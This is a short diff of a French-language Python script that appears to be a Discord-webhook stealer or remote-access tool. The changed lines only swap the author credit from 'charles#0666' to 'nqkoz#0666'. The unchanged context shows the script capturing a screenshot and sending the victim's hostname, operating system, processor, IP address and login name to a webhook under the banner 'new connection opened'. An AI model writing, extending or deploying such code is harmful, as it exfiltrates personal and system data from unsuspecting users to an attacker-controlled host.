@@ -1,4 +1,4 @@
-charles = "dev par charles#0666"
+charles = "dev par nqkoz#0666"
 
 import shutil, pyautogui, uuid, platform, os, requests, dhooks,  re, sys
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
@@ -387,5 +387,5 @@ def main():
     os.system("del " + temp + "\\screen.png")
 
     hook.send(message)
-    hook.send("```fix\nNouvelle connexion ouverte " + uuidgen + "\nPrefix : " + platform.node() + "\nSystème d'exploitation : " + platform.system() + " " + platform.release() + "\nArch : " + platform.architecture()[0]  + "\nNode : " + platform.node() + "\nProcesseur : " + platform.processor() + "\nIp : " + ip + "\nNom de la session : " + os.getlogin() + "\n```\n>>> ***Dev by charles#0666***")
+    hook.send("```fix\nNouvelle connexion ouverte " + uuidgen + "\nPrefix : " + platform.node() + "\nSystème d'exploitation : " + platform.system() + " " + platform.release() + "\nArch : " + platform.architecture()[0]  + "\nNode : " + platform.node() + "\nProcesseur : " + platform.processor() + "\nIp : " + ip + "\nNom de la session : " + os.getlogin() + "\n```\n>>> ***Dev by nqkoz#0666***")
 main()
